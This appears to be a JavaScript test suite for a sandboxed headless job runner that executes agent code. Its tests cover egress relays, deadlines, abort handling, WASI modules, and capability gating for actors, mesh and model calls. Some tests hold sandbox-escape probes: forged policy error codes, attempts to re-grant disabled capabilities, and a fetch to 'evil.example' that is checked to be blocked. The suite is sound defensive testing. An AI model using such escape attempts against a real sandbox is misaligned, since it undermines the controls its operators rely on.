// @ts-check
// offscreen job-runner — the headless sealed-Worker substrate behind script.
// Exercised against a REAL worker; `sendToSW` is stubbed to stand in for the
// SW's audited routes (sw/web-fetch, actor/spawn). Pins the load-bearing
// behavior: code returns its value, console accumulates, peerd.egress.fetch
// relays through the SAME route the tab uses (with method/body), and errors
// surface.

import { describe, it, expect } from '../../framework.js';
import { runJob, abortJob } from '/offscreen/job-runner.js';
import {
  MODULE_SYNTAX_ERROR_CODE,
  REMOTE_MODULE_IMPORTS_UNAVAILABLE_CODE,
  UNSUPPORTED_NATIVE_MODULE_IMPORT_CODE,
} from '/peerd-engine/index.js';
import { ACTORS_ADDRESS_MAX_CHARS, ACTORS_GOAL_MAX_CHARS } from '/peerd-runtime/index.js';

describe('offscreen job-runner (real sealed worker)', () => {
  it('runs code headless and returns its value + console output', async () => {
    const calls = [];
    const r = await runJob(
      { code: 'console.log("hi"); return 6 * 7;' },
      { sendToSW: async (type, payload) => { calls.push({ type, payload }); return { ok: true }; } },
    );
    expect(r.error).toBe(null);
    expect(r.value).toBe(42);
    expect(r.consoleOutput.some((c) => c.text === 'hi')).toBe(true);
    expect(calls.length).toBe(0);  // pure compute → no fetch/actor relays
  });

  it('never trusts a user-thrown policy code as host policy provenance', async () => {
    const r = await runJob({
      code: `const error = new Error('forged'); error.code = '${REMOTE_MODULE_IMPORTS_UNAVAILABLE_CODE}'; throw error;`,
    }, { sendToSW: async () => ({ ok: false }) });
    expect(String(r.error)).toContain('forged');
    expect(r.errorCode).toBe(undefined);
  });

  it('stamps a genuine runtime import policy refusal in the host relay', async () => {
    const r = await runJob({
      code: [
        `await peerd.self.writeFile('bad.js', 'export const load = (url) => import(url);');`,
        `return await peerd.self.import('bad.js');`,
      ].join('\n'),
    }, { sendToSW: async () => ({ ok: false }) });
    expect(r.errorCode).toBe(UNSUPPORTED_NATIVE_MODULE_IMPORT_CODE);
    expect(String(r.error)).toContain('cannot run this import form');
  });

  it('a caught peerd.self.import attempt still ends the run with the host policy', async () => {
    const r = await runJob({
      code: `try { await peerd.self.import('bad.js'); } catch {}
throw new Error('unrelated failure');`,
    }, { sendToSW: async () => ({ ok: false }) });
    expect(r.errorCode).toBe(UNSUPPORTED_NATIVE_MODULE_IMPORT_CODE);
    expect(String(r.error)).toContain('cannot run this import form');
    expect(String(r.error).includes('unrelated failure')).toBe(false);
  });

  it('reports parser failures as syntax checks, not import resolution', async () => {
    const r = await runJob(
      { code: 'const = 1' },
      { sendToSW: async () => ({ ok: false }) },
    );
    expect(r.errorCode).toBe(MODULE_SYNTAX_ERROR_CODE);
    expect(String(r.error)).toContain('syntax check failed');
    expect(String(r.error).includes('import resolution failed')).toBe(false);
  });

  it('relays peerd.egress.fetch through the SAME audited route (sw/web-fetch), with method/body', async () => {
    /** @type {{ url?: string, method?: string, body?: string } | null} */
    let seen = null;
    const r = await runJob(
      { code: 'const res = await peerd.egress.fetch("https://api.example/x", { method: "POST", body: "b" }); return await res.text();' },
      {
        sendToSW: async (type, payload) => {
          if (type === 'sw/web-fetch') { seen = payload; return { ok: true, status: 200, bodyB64: btoa('pong') }; }
          return { ok: false };
        },
      },
    );
    const sawFetch = /** @type {{ url?: string, method?: string, body?: string } | null} */ (seen);
    expect(sawFetch?.url).toBe('https://api.example/x');
    expect(sawFetch?.method).toBe('POST');
    expect(sawFetch?.body).toBe('b');
    expect(r.value).toBe('pong');
    expect(r.error).toBe(null);
  });

  it('returns a capped privacy-minimal code bridge trace', async () => {
    const r = await runJob(
      {
        code: [
          'for (let i = 0; i < 55; i += 1) await peerd.self.listFiles();',
          'try { await peerd.egress.fetch("https://trace.example/x"); } catch {}',
          'return "done";',
        ].join('\n'),
      },
      { sendToSW: async () => ({ ok: false, status: 0, error: 'blocked' }) },
    );
    expect(r.value).toBe('done');
    const trace = /** @type {any[]} */ (r.codeTrace);
    expect(trace.length).toBe(50);
    expect(trace[0].seq > 1).toBe(true);   // oldest entries were evicted
    expect(trace.at(-1).bridge).toBe('fetch');
    expect(trace.at(-1).method).toBe('GET');
    expect(trace.at(-1).outcome).toBe('error');
    expect(trace.at(-1).settled).toBe(true);
    expect(typeof trace.at(-1).ms).toBe('number');
    // Host observability never copies code-client arguments or results.
    expect(Object.hasOwn(trace.at(-1), 'args')).toBe(false);
    expect(Object.hasOwn(trace.at(-1), 'result')).toBe(false);
  });

  it('uses one absolute deadline across import resolution and worker execution', async () => {
    const startedAt = performance.now();
    const r = await runJob(
      {
        code: [
          "import { value } from 'https://slow.example/value.js';",
          'await new Promise((resolve) => setTimeout(resolve, 350));',
          'return value;',
        ].join('\n'),
        timeoutMs: 550,
      },
      {
        sendToSW: async (type) => {
          if (type !== 'sw/web-fetch') return { ok: false };
          await new Promise((resolve) => setTimeout(resolve, 350));
          return { ok: true, status: 200, bodyB64: btoa('export const value = 42;') };
        },
      },
    );
    const elapsedMs = performance.now() - startedAt;
    expect(String(r.error)).toContain('job timed out after 550ms');
    expect(r.value).toBe(undefined);
    // The pre-fix runner gave each phase 550ms and returned 42 after ~700ms.
    expect(elapsedMs < 900).toBe(true);
  });

  it('reserves compute capacity when page, a2a, and site-client jobs relay outward', async () => {
    /** @type {(() => void) | undefined} */
    let release;
    const barrier = new Promise((resolve) => { release = () => resolve(undefined); });
    let relays = 0;
    /** @type {(() => void) | undefined} */
    let bothStarted;
    const started = new Promise((resolve) => { bothStarted = () => resolve(undefined); });
    const sendToSW = async (/** @type {string} */ type) => {
      if (type === 'page-program/snapshot' || type === 'site-fetch/call') {
        relays += 1;
        if (relays === 2) bothStarted?.();
        await barrier;
        return type === 'page-program/snapshot'
          ? { ok: true, value: 'snapshot' }
          : { ok: true, value: { status: 200, body: 'ok', json: null } };
      }
      return { ok: true };
    };
    const pageRun = runJob(
      { code: 'return await page.snapshot();', caps: { page: true }, ownerSessionId: 'web-1', runId: 'page-relay-1', timeoutMs: 5000 },
      { sendToSW },
    );
    const siteRun = runJob(
      { code: 'return await site.fetch("/x");', siteFetch: 'https://site.example', ownerSessionId: 'api-1', runId: 'site-relay-1', timeoutMs: 5000 },
      { sendToSW },
    );
    await started;

    // page + site consume the relay sub-cap; a2a is classified in the same
    // lane and is refused without spawning a third outward-waiting worker.
    const refused = await runJob(
      { code: 'return await mesh.peers();', a2a: true, ownerSessionId: 'dweb-1', runId: 'a2a-relay-1' },
      { sendToSW },
    );
    expect(String(refused.error)).toContain('capability-relaying runs already in flight');

    // A normal script does not reserve the sub-cap merely because egress is
    // available; it acquires on the first actual outward relay and is refused
    // there while the two dedicated relay runs are holding the lane.
    const refusedEgress = await runJob(
      { code: 'return await peerd.egress.fetch("https://example.com");' },
      { sendToSW },
    );
    expect(String(refusedEgress.error)).toContain('capability-relaying runs already in flight');

    // Two global slots remain available to quick compute.
    const compute = await runJob(
      { code: 'return 6 * 7;' },
      { sendToSW },
    );
    expect(compute.value).toBe(42);
    release?.();
    const settled = await Promise.all([pageRun, siteRun]);
    expect(settled.every((result) => result.error === null)).toBe(true);
  });

  it('keeps a failed page call host receipt when user code catches and discards the error', async () => {
    const policy = {
      reason: 'child_navigation_failed', outcome: 'unverified', child: 'uncontained', retryable: false,
    };
    const result = await runJob(
      {
        code: 'try { await page.click("#open"); } catch {} return "handled";',
        caps: { page: true }, ownerSessionId: 'web-policy', runId: 'page-policy-failure',
      },
      {
        sendToSW: async () => ({ ok: false, error: 'click failed', browserPolicies: [policy] }),
      },
    );
    expect(result.error).toBe(null);
    expect(result.value).toBe('handled');
    expect(result.browserPolicies).toEqual([policy]);
  });

  it('exposes only the exact App client and relays owner/run identity from trusted job params', async () => {
    /** @type {Array<{type:string,payload:{method?:string,ownerSessionId?:string,runId?:string}}>} */
    const calls = [];
    const result = await runJob(
      {
        code: 'const before = await app.observe(); await app.act("move", { x: 1 }); await app.wait(1); return before;',
        caps: { app: true, page: false, egress: false, subagent: false, opfs: false },
        ownerSessionId: 'app-actor-1', runId: 'app-run-1',
      },
      {
        sendToSW: async (/** @type {string} */ type, /** @type {{ownerSessionId?:string,runId?:string}} */ payload) => {
          calls.push({ type, payload });
          if (type === 'app-code/observe') return { ok: true, value: { screen: 'game' } };
          return { ok: true, value: { accepted: true } };
        },
      },
    );
    expect(result.error).toBe(null);
    expect(result.value).toEqual({ screen: 'game' });
    expect(result.usedApp).toBe(true);
    expect(calls.map((call) => call.type)).toEqual(['app-code/observe', 'app-code/act']);
    expect(calls.every((call) => call.payload.ownerSessionId === 'app-actor-1')).toBe(true);
    expect(calls.every((call) => call.payload.runId === 'app-run-1')).toBe(true);
    const codeTrace = /** @type {Array<{bridge:string,method:string}>} */ (result.codeTrace ?? []);
    expect(codeTrace.map((entry) => `${entry.bridge}.${entry.method}`))
      .toEqual(['app.observe', 'app.act']);
  });

  it('host-custodies an ambiguous App action even when worker code catches the rejection', async () => {
    const result = await runJob(
      {
        code: 'try { await app.act("start-game"); } catch {} return "caught";',
        caps: { app: true, page: false, egress: false, subagent: false, opfs: false },
        ownerSessionId: 'app-actor-unknown', runId: 'app-run-unknown',
      },
      {
        sendToSW: async () => ({
          ok: false, error: 'ack lost', outcomeKnown: false, outcomeKind: 'transport-lost',
        }),
      },
    );
    expect(result.value).toBe('caught');
    expect(result.appOutcomeUnknown).toBe(true);
    expect(result.appOutcomeError).toBe('ack lost');
    expect(String(result.error)).toContain('app action outcome unknown');
  });

  it('terminates a page job when an inner host policy ends the actor turn', async () => {
    const result = await runJob(
      {
        code: 'await page.snapshot(); return "must not continue";',
        caps: { page: true }, ownerSessionId: 'web-auth-wait', runId: 'page-auth-wait',
      },
      {
        sendToSW: async () => ({
          ok: false, error: 'auth_waiting_for_user', endTurn: true,
          endTurnContent: 'Finish signing in in the open tab.',
          endTurnOutcomeKind: 'pre-effect-failure',
        }),
      },
    );
    expect(result.endTurn).toBe(true);
    expect(result.endTurnContent).toBe('Finish signing in in the open tab.');
    expect(result.endTurnOutcomeKind).toBe('pre-effect-failure');
    expect(result.value).toBe(undefined);
  });

  it('aborts SW relays before releasing a settled job\'s relay lease', async () => {
    /** @type {(() => void) | undefined} */
    let releaseAbort;
    const abortBarrier = new Promise((resolve) => { releaseAbort = () => resolve(undefined); });
    let aborts = 0;
    /** @type {(() => void) | undefined} */
    let bothAborting;
    const aborting = new Promise((resolve) => { bothAborting = () => resolve(undefined); });
    const deps = {
      sendToSW: async (/** @type {string} */ type) => type === 'page-program/snapshot'
        ? { ok: true, value: 'snapshot' }
        : { ok: true, value: { status: 200, body: 'ok', json: null } },
      abortRun: async () => {
        aborts += 1;
        if (aborts === 2) bothAborting?.();
        await abortBarrier;
      },
    };
    const pageRun = runJob(
      { code: 'return await page.snapshot();', caps: { page: true }, ownerSessionId: 'web-finalize', runId: 'page-finalize' },
      deps,
    );
    const siteRun = runJob(
      { code: 'return await site.fetch("/x");', siteFetch: 'https://site.example', ownerSessionId: 'api-finalize', runId: 'site-finalize' },
      deps,
    );
    await aborting;

    // Both workers have returned, but their SW abort handshakes are pending, so
    // neither relay lease may be reused yet.
    const refused = await runJob(
      { code: 'return await mesh.peers();', a2a: true, ownerSessionId: 'dweb-finalize', runId: 'a2a-finalize' },
      deps,
    );
    expect(String(refused.error)).toContain('capability-relaying runs already in flight');

    releaseAbort?.();
    const settled = await Promise.all([pageRun, siteRun]);
    expect(settled.every((result) => result.error === null)).toBe(true);
  });

  it('bounds early Stop tombstones and keeps owner-bound tombstones scoped', async () => {
    abortJob('early-owned', 'other-session');
    const owned = await runJob(
      { code: 'return 7;', runId: 'early-owned', ownerSessionId: 'right-session' },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(owned.value).toBe(7);

    abortJob('early-evicted');
    for (let i = 0; i < 64; i += 1) abortJob(`early-fifo-${i}`);
    const evicted = await runJob(
      { code: 'return 8;', runId: 'early-evicted' },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(evicted.value).toBe(8);
  });

  // Design 02, 2a — extract:'markdown' on the bridged fetch. The extraction
  // pipeline is INJECTED (deps.extractMarkdown — in production offscreen.js
  // passes web-extract-core's extractMarkdownLocal); stubbed here so the test
  // pins the host-relay + realm-surface shape in isolation. The REAL pipeline
  // (and host parity) runs in notebook-tab/notebook-extract.test.js.
  it("peerd.egress.fetch(url, { extract: 'markdown' }) returns markdown for an HTML response", async () => {
    /** @type {{ html?: string, url?: string } | null} */
    let extractorSaw = null;
    const html = '<html><body><article>Long article body</article></body></html>';
    const r = await runJob(
      {
        code: [
          'const res = await peerd.egress.fetch("https://site.example/post", { extract: "markdown" });',
          'return { text: await res.text(), extracted: res.extracted, contentType: res.contentType };',
        ].join('\n'),
      },
      {
        sendToSW: async (type) => (type === 'sw/web-fetch'
          ? { ok: true, status: 200, headers: { 'content-type': 'text/html' }, bodyB64: btoa(html) }
          : { ok: false }),
        extractMarkdown: async (source) => { extractorSaw = source; return { readerable: true, markdown: '# Article\n\nLong article body' }; },
      },
    );
    expect(r.error).toBe(null);
    const v = /** @type {{ text: string, extracted: boolean, contentType: string }} */ (r.value);
    expect(v.text).toBe('# Article\n\nLong article body');
    expect(v.extracted).toBe(true);
    expect(v.contentType).toBe('text/markdown');
    expect(/** @type {any} */ (extractorSaw)?.url).toBe('https://site.example/post');
    expect(r.usedEgress).toBe(true);   // extraction never launders the fence
  });

  it('extract on a non-HTML response passes the body through unchanged, extracted:false', async () => {
    let extractorCalled = false;
    const r = await runJob(
      {
        code: [
          'const res = await peerd.egress.fetch("https://api.example/data.json", { extract: "markdown" });',
          'return { body: await res.text(), extracted: res.extracted };',
        ].join('\n'),
      },
      {
        sendToSW: async () => ({ ok: true, status: 200, headers: { 'content-type': 'application/json' }, bodyB64: btoa('{"a":1}') }),
        extractMarkdown: async () => { extractorCalled = true; return { readerable: true, markdown: 'x' }; },
      },
    );
    expect(r.error).toBe(null);
    const v = /** @type {{ body: string, extracted: boolean }} */ (r.value);
    expect(v.body).toBe('{"a":1}');      // mixed-URL fan-outs: no throw, no rewrite
    expect(v.extracted).toBe(false);
    expect(extractorCalled).toBe(false);
  });

  it('surfaces a thrown error (and resolves, does not hang)', async () => {
    const r = await runJob(
      { code: 'throw new Error("boom");' },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(r.value).toBe(undefined);
    expect(String(r.error)).toContain('boom');
  });

  it('peerd:std imports resolve in a headless job', async () => {
    const r = await runJob(
      { code: 'import { mean } from "peerd:std";\nreturn mean([2, 4, 6]);' },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(r.error).toBe(null);
    expect(r.value).toBe(4);
  });

  // The idiomatic form the agent writes for headless math: a STATIC top-level
  // `import { … } from 'peerd:std'` (resolved via buildEntry's builtins, same as
  // a Notebook). Pins math PARITY between script and js_notebook — the headless
  // worker must reach the same stdlib helpers the visible Notebook does.
  it('peerd:std STATIC imports resolve in a headless job (math parity with notebooks)', async () => {
    const r = await runJob(
      { code: 'import { mean, median, sum } from "peerd:std";\nreturn { m: mean([2, 4, 6]), md: median([5, 1, 9, 3]), s: sum([10, 20, 30]) };' },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(r.error).toBe(null);
    const v = /** @type {{ m: number, md: number, s: number }} */ (r.value);
    expect(v.m).toBe(4);
    expect(v.md).toBe(4);
    expect(v.s).toBe(60);
  });

  // peerd:wasi END TO END in the real substrate: builtin resolution in the
  // sealed worker, the vendored shim linking, a wasm module actually executing.
  // The module is a hand-assembled wasm32-wasi command (fd_write "hello from
  // wasm\n" to stdout, proc_exit 0) — regenerate with tests/engine-tabs/notebook-tab/
  // wasi-test-module.ts buildHelloModule('hello from wasm\n').
  it('peerd:wasi runs a wasm32-wasi module inside a headless job', async () => {
    const helloWasmB64 = 'AGFzbQEAAAABEANgBH9/f38Bf2ABfwBgAAACRgIWd2FzaV9zbmFwc2hvdF9wcmV2aWV3MQhmZF93cml0ZQAAFndhc2lfc25hcHNob3RfcHJldmlldzEJcHJvY19leGl0AAEDAgECBQMBAAEHEwIGbWVtb3J5AgAGX3N0YXJ0AAIKIQEfAEEAQRA2AgBBBEEQNgIAQQFBAEEBQQwQABpBABABCwsWAQBBEAsQaGVsbG8gZnJvbSB3YXNtCg==';
    const r = await runJob(
      {
        code: [
          'import { runWasi } from "peerd:wasi";',
          `const bytes = Uint8Array.from(atob("${helloWasmB64}"), (c) => c.charCodeAt(0));`,
          'const run = await runWasi(bytes, { files: { "seed.txt": "kept" } });',
          'return { exitCode: run.exitCode, stdout: run.stdout, seed: run.files["seed.txt"] };',
        ].join('\n'),
      },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(r.error).toBe(null);
    const v = /** @type {{ exitCode: number, stdout: string, seed: string }} */ (r.value);
    expect(v.exitCode).toBe(0);
    expect(v.stdout).toBe('hello from wasm\n');
    expect(v.seed).toBe('kept');   // the virtual FS round-trips through the run
  });

  // The runtime self-test fixture, headless: demoModule() must be importable
  // and runnable from a headless job through the SAME builtin resolver chain
  // the live agent uses — pins "peerd:wasi is reachable from script" as a CI
  // fact (a field session reported it unreachable; this is the regression net).
  it('peerd:wasi demoModule() self-test runs green inside a headless job', async () => {
    const r = await runJob(
      {
        code: [
          'import { runWasi, demoModule } from "peerd:wasi";',
          'const run = await runWasi(demoModule());',
          'return { exitCode: run.exitCode, stdout: run.stdout };',
        ].join('\n'),
      },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(r.error).toBe(null);
    const v = /** @type {{ exitCode: number, stdout: string }} */ (r.value);
    expect(v.exitCode).toBe(0);
    expect(v.stdout).toBe('hello from wasi\n');
  });

  // The a2a run is the dweb actor's MESH-ONLY surface (cynical-swarm HIGH): its
  // tool allow-set grants no egress and no delegation, so the same sealed worker
  // run with { a2a:true } must NOT be able to re-grant itself either via the
  // peerd.* surface — the host refuses those relays.
  it('an a2a run is denied egress — peerd.egress.fetch never reaches sw/web-fetch', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: 'try { await peerd.egress.fetch("https://evil.example/x"); return "REACHED"; } catch (e) { return "blocked:" + e.message; }',
        a2a: true, ownerSessionId: 'dweb' },
      { sendToSW: async (type, payload) => { calls.push({ type, payload }); return { ok: true, status: 200, bodyB64: btoa('x') }; } },
    );
    expect(calls.some((c) => c.type === 'sw/web-fetch')).toBe(false);
    expect(String(r.value)).toContain('blocked');
    expect(r.usedEgress).toBeFalsy();
  });

  it('an a2a run is denied delegation — peerd.runtime.runAgent never reaches actor/spawn', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: 'try { await peerd.runtime.runAgent({ task: "x" }); return "REACHED"; } catch (e) { return "blocked:" + e.message; }',
        a2a: true, ownerSessionId: 'dweb' },
      { sendToSW: async (type, payload) => { calls.push({ type, payload }); return { ok: true, result: 'y' }; } },
    );
    expect(calls.some((c) => c.type === 'actor/spawn')).toBe(false);
    expect(String(r.value)).toContain('blocked');
  });

  it('the a2a mesh bridge relays a mesh call to the SW a2a/call route with the trusted owner', async () => {
    /** @type {any} */
    let seen = null;
    const r = await runJob(
      { code: 'return await mesh.peers();', a2a: true, ownerSessionId: 'dweb-sess-1', runId: 'a2a-run-1' },
      { sendToSW: async (type, payload) => {
        if (type === 'a2a/call') { seen = payload; return { ok: true, value: [{ did: 'did:key:z6MkBob' }] }; }
        return { ok: false };
      } },
    );
    expect(seen?.method).toBe('peers');
    expect(seen?.ownerSessionId).toBe('dweb-sess-1');  // owner from trusted job params, not the worker
    expect(seen?.runId).toBe('a2a-run-1');
    expect(r.error).toBe(null);
    expect(/** @type {any} */ (r.value)?.[0]?.did).toBe('did:key:z6MkBob');
  });

  it('a mesh call in a NON-a2a run is refused (the bridge is capability-gated)', async () => {
    const r = await runJob(
      { code: 'try { await mesh.peers(); return "REACHED"; } catch (e) { return "no-mesh"; }' },
      { sendToSW: async () => ({ ok: true }) },
    );
    // globalThis.mesh is only injected when a2a is set → ReferenceError → caught.
    expect(String(r.value)).toBe('no-mesh');
  });

  it('a2a: abortJob(runId) terminates a live mesh run instead of orphaning it to its timeout (#153)', async () => {
    // Pre-fix, the a2a lane never carried a runId, so a Stop left the worker
    // holding a shared headless slot for its full wall-clock. The runner's
    // runId registration is lane-agnostic; this pins it for a2a specifically,
    // owner-bound the way the SW job/abort route passes it.
    const pending = runJob(
      {
        code: 'await mesh.ask("did:key:z6MkBob", "long ask"); return "never";',
        a2a: true, ownerSessionId: 'dweb-sess-1', runId: 'a2a-abort-1', timeoutMs: 30000,
      },
      {
        sendToSW: (type) => new Promise((resolve) => {
          // the ask hangs (a live peer exchange) until the abort fires
          if (type === 'a2a/call') setTimeout(() => resolve({ ok: false, error: 'aborted' }), 5000);
          else resolve({ ok: true });
        }),
      },
    );
    // give the worker a beat to issue the ask, then Stop
    await new Promise((res) => setTimeout(res, 400));
    abortJob('a2a-abort-1', 'dweb-sess-1');
    const r = await pending;
    expect(r.error).toContain('aborted');
  });

  // design 7.3 — headless peerd.distributed.* must fail FAST. The runner forces
  // the distributed cap off (this host has no 'distributed-request' handler),
  // so the in-realm shim throws immediately; the host relay's refusal is the
  // second wall. Pre-fix a touch of peerd.distributed.* hung to the job
  // wall-clock. Exercised against the REAL worker: if either wall regresses AND
  // the forced-off profile is dropped, the run times out at timeoutMs and the
  // assertions below fail — the hang cannot come back silently.
  it('headless peerd.distributed.whoami() rejects immediately — even when caller caps ask for it', async () => {
    const t0 = performance.now();
    const r = await runJob(
      // why the cast: caps.distributed is deliberately NOT on runJob's typedef
      // (it is not a caller knob headless) — this passes it anyway to pin that
      // a wider caller profile still cannot re-open the lane.
      /** @type {any} */ ({
        code: 'try { await peerd.distributed.whoami(); return "REACHED"; } catch (e) { return "blocked:" + e.message; }',
        caps: { distributed: true },
        timeoutMs: 5000,
      }),
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(r.error).toBe(null);
    expect(String(r.value)).toContain('blocked');
    expect(String(r.value)).toContain('not available');
    expect(performance.now() - t0 < 4000).toBe(true);  // fast refusal, not the wall-clock
  });

  // ── the actors delegation surface (script orchestration) ─────────────────

  it('actors: ask relays to the SW actors/call route with owner ids from TRUSTED job params', async () => {
    /** @type {any[]} */
    const calls = [];
    const r = await runJob(
      {
        code: 'const a = await actors.ask("vm-9", "run pytest", { oneShot: true }); return a.reply;',
        actors: true, ownerSessionId: 'chat-1', ownerToolUseId: 'tu-7', runId: 'run-1',
      },
      {
        sendToSW: async (type, payload) => {
          calls.push({ type, payload });
          return { ok: true, reply: 'pass: 42 tests', failed: false };
        },
      },
    );
    expect(r.error).toBe(null);
    expect(r.value).toBe('pass: 42 tests');
    expect(calls.length).toBe(1);
    const c = /** @type {any} */ (calls[0]);
    expect(c.type).toBe('actors/call');
    expect(c.payload.args).toEqual({ to: 'vm-9', goal: 'run pytest', oneShot: true });
    // owner identity rides from job params — the worker cannot spoof it
    expect(c.payload.ownerSessionId).toBe('chat-1');
    expect(c.payload.ownerToolUseId).toBe('tu-7');
    expect(c.payload.runId).toBe('run-1');
  });

  it('actors: shapes raw authority roster and failed-call replies for worker code', async () => {
    const listed = await runJob(
      {
        code: 'return await actors.list();',
        actors: true, ownerSessionId: 'chat-1', runId: 'run-list',
      },
      {
        sendToSW: async () => ({
          ok: true,
          roster: {
            tabs: [{ id: 9, title: 'Report', url: 'https://docs.example/report', active: true }],
          },
        }),
      },
    );
    expect(listed.error).toBe(null);
    expect(listed.value).toEqual({ refs: [{
      ref: '9', type: 'tab', name: 'Report', live: true, current: true,
      detail: 'https://docs.example',
    }] });

    const failed = await runJob(
      {
        code: 'return await actors.call("vm-1", "run tests");',
        actors: true, ownerSessionId: 'chat-1', runId: 'run-failed',
      },
      { sendToSW: async () => ({ ok: true, reply: 'tests failed', failed: true }) },
    );
    expect(failed.error).toBe(null);
    expect(failed.value).toEqual({ reply: 'tests failed', failed: true });
    const actorsTrace = /** @type {any[]} */ (failed.actorsTrace);
    const codeTrace = /** @type {any[]} */ (failed.codeTrace);
    expect(actorsTrace.length).toBe(1);
    expect(actorsTrace[0].actorFailed).toBe(true);
    expect(codeTrace.length).toBe(1);
    expect(codeTrace[0].bridge).toBe('actors');
    expect(codeTrace[0].method).toBe('call');
    expect(codeTrace[0].outcome).toBe('error');
    expect(codeTrace[0].ok).toBe(false);
  });

  it('actors: collects delivery custody outside the worker-visible call result', async () => {
    const r = await runJob(
      {
        code: [
          'const one = await actors.call("vm-1", "one");',
          'const two = await actors.call("vm-2", "two");',
          'return [one.reply, two.reply, Object.keys(one)];',
        ].join('\n'),
        actors: true, ownerSessionId: 'chat-1', runId: 'run-custody',
      },
      {
        sendToSW: async (_type, payload) => ({
          ok: true,
          actorDeliveryId: `delivery-${/** @type {any} */ (payload).args.to}`,
          reply: /** @type {any} */ (payload).args.to,
          failed: false,
        }),
      },
    );

    expect(r.error).toBe(null);
    expect(r.value).toEqual(['vm-1', 'vm-2', ['reply', 'failed']]);
    expect(r.actorDeliveryIds).toEqual(['delivery-vm-1', 'delivery-vm-2']);
  });

  it('actors: preserves delivery custody when a later self import terminates on policy', async () => {
    const r = await runJob(
      {
        code: [
          'await actors.call("vm-1", "one");',
          'return await peerd.self.import("bad.js");',
        ].join('\n'),
        actors: true, ownerSessionId: 'chat-1', runId: 'run-policy-custody',
      },
      {
        sendToSW: async () => ({
          ok: true,
          actorDeliveryId: 'delivery-before-import',
          reply: 'done', failed: false,
        }),
      },
    );

    expect(r.errorCode).toBe(UNSUPPORTED_NATIVE_MODULE_IMPORT_CODE);
    expect(String(r.error)).toContain('cannot run this import form');
    expect(r.actorDeliveryIds).toEqual(['delivery-before-import']);
  });

  it('actors: the DELEGATIONS trace records every op with outcome + timing, and usedActors flags the run', async () => {
    const r = await runJob(
      {
        code: [
          'await actors.ask("vm-9", "one");',
          'try { await actors.ask("web", "two"); } catch (e) { /* refused */ }',
          'return "done";',
        ].join('\n'),
        actors: true, ownerSessionId: 'chat-1', runId: 'run-2',
      },
      {
        sendToSW: async (_type, payload) => (
          /** @type {any} */ (payload).args?.to === 'web'
            ? { ok: false, error: 'message_actor: refused by the sender gate' }
            : { ok: true, reply: 'ok', failed: false }),
      },
    );
    expect(r.error).toBe(null);
    expect(r.usedActors).toBe(true);
    const trace = /** @type {any[]} */ (r.actorsTrace);
    expect(trace.length).toBe(2);
    expect(trace[0].seq).toBe(1);
    expect(trace[0].method).toBe('ask');
    expect(trace[0].to).toBe('vm-9');
    expect(trace[0].goal).toBe('one');
    expect(trace[0].ok).toBe(true);
    expect(trace[1].ok).toBe(false);
    expect(trace[1].error).toContain('sender gate');
    expect(typeof trace[1].ms).toBe('number');
  });

  it('actors: the capability is DENIED when the run was not minted with it (and when no owner)', async () => {
    // actors:false — the stub is absent entirely, so `actors` is undefined in the realm
    const off = await runJob(
      { code: 'return typeof actors;' },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(off.value).toBe('undefined');
    // actors:true but NO ownerSessionId — the host refuses the relay (fail closed)
    const noOwner = await runJob(
      { code: 'try { await actors.ask("vm-9", "x"); return "reached"; } catch (e) { return e.message; }', actors: true },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(String(noOwner.value)).toContain('disabled');
    expect(noOwner.usedActors).toBe(false);
  });

  it('actors: a pure-compute actors run keeps usedActors false and its trace empty', async () => {
    const r = await runJob(
      { code: 'return 1 + 1;', actors: true, ownerSessionId: 'chat-1' },
      { sendToSW: async () => ({ ok: true }) },
    );
    expect(r.value).toBe(2);
    expect(r.usedActors).toBe(false);
    expect(/** @type {any[]} */ (r.actorsTrace).length).toBe(0);
  });

  it('actors: oversized addresses and goals stop at the host before trace allocation or an SW call', async () => {
    /** @type {any[]} */
    const calls = [];
    const r = await runJob(
      {
        code: [
          'const errors = [];',
          `for (const [address, message] of [["a".repeat(${ACTORS_ADDRESS_MAX_CHARS + 1}), "x"], ["web", "g".repeat(${ACTORS_GOAL_MAX_CHARS + 1})]]) {`,
          '  try { await actors.call(address, message); } catch (e) { errors.push(e.message); }',
          '}',
          'return errors;',
        ].join('\n'),
        actors: true, ownerSessionId: 'chat-1', runId: 'run-bounds',
      },
      {
        sendToSW: async (type, payload) => {
          calls.push({ type, payload });
          return { ok: true, reply: 'should not run', failed: false };
        },
      },
    );
    expect(r.error).toBe(null);
    expect(r.usedActors).toBe(true);
    expect(/** @type {any[]} */ (r.actorsTrace)).toEqual([]);
    expect(calls.filter((c) => c.type === 'actors/call')).toEqual([]);
    expect(Array.isArray(r.value)).toBe(true);
    expect(/** @type {string[]} */ (r.value).every((error) => error.includes('at most'))).toBe(true);
  });

  // ── the provider sub-model surface (design 5) ─────────────────────────────

  it('provider: a stubbed round-trip returns text into the worker, with trusted owner/runId on the relay', async () => {
    /** @type {any[]} */
    const calls = [];
    const r = await runJob(
      {
        code: 'const r = await peerd.provider.call({ prompt: "classify: good or bad?" }); return r.text;',
        caps: { provider: true }, ownerSessionId: 'chat-1', runId: 'run-p1',
      },
      {
        sendToSW: async (type, payload) => {
          calls.push({ type, payload });
          return { ok: true, value: { text: 'good', model: 'm-1', usage: { inputTokens: 5, outputTokens: 7 } } };
        },
      },
    );
    expect(r.error).toBe(null);
    expect(r.value).toBe('good');
    const c = /** @type {any} */ (calls[0]);
    expect(c.type).toBe('script/model-call');
    // owner + runId ride from TRUSTED job params — the worker cannot spoof them
    expect(c.payload.ownerSessionId).toBe('chat-1');
    expect(c.payload.runId).toBe('run-p1');
    expect(c.payload.args?.prompt).toBe('classify: good or bad?');
    expect(Number.isSafeInteger(c.payload.deadlineAt)).toBe(true);
    // the host-counted meter rides the result (the [MODEL CALLS] line's source)
    expect(r.usedProvider).toBe(true);
    expect(r.providerCalls).toBe(1);
    expect(r.providerTokens).toBe(12);
  });

